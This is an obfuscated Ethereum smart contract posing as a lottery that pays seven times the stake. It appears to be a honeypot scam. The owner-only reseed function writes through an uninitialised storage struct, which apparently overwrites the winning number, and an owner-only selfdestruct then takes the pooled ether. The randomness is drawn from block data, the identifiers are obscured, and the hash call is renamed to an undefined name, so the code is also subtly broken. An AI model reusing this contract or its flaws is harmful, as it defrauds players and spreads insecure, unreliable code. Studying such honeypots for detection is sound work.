contract OpenAddressLottery{
    struct SeedComponents{
        uint _0xc69c8e;
        uint _0x19f225;
        uint _0x182c76;
        uint _0x6fc64c;
    }

    address _0xec7367;
    uint private _0x60c2c0;
    uint private _0x285e5e;
    uint LuckyNumber = 7;

    mapping (address => bool) _0xca8660;

    function OpenAddressLottery() {
        _0xec7367 = msg.sender;
        _0x2427aa(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp));
    }

    function _0x987bf6() payable {
        if(msg.value<0.1 ether)
            return;


        require(_0xca8660[msg.sender] == false);

        if(_0x4b8cd2(msg.sender) == LuckyNumber){
            _0xca8660[msg.sender] = true;

            uint _0x973b80=msg.value*7;

            if(_0x973b80>this.balance)
                _0x973b80=this.balance;
            msg.sender.transfer(_0x973b80);
        }

        if(block.number-_0x285e5e>1000)
            _0x2427aa(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp));
    }

    function _0x4b8cd2(address _0x74406d) constant returns(uint n){

        n = uint(_0xcff3d6(uint(_0x74406d), _0x60c2c0)[0]) % 8;
    }

    function _0x2427aa(SeedComponents _0x1562fb) internal {
        _0x60c2c0 = uint256(_0xcff3d6(
            _0x1562fb._0xc69c8e,
            _0x1562fb._0x19f225,
            _0x1562fb._0x182c76,
            _0x1562fb._0x6fc64c
        ));
        if (1 == 1) { _0x285e5e = block.number; }
    }

    function _0x766364() {
        require(msg.sender==_0xec7367);

        selfdestruct(msg.sender);
    }

    function _0x0d0656() {
        require(msg.sender==_0xec7367);

        SeedComponents s;
        s._0xc69c8e = uint(msg.sender);
        s._0x19f225 = uint256(block.blockhash(block.number - 1));
        s._0x182c76 = block.difficulty*(uint)(block.coinbase);
        s._0x6fc64c = tx.gasprice * 7;

        _0x2427aa(s);
    }

    function () payable {
        if(msg.value>=0.1 ether && msg.sender!=_0xec7367)
            _0x987bf6();
    }

}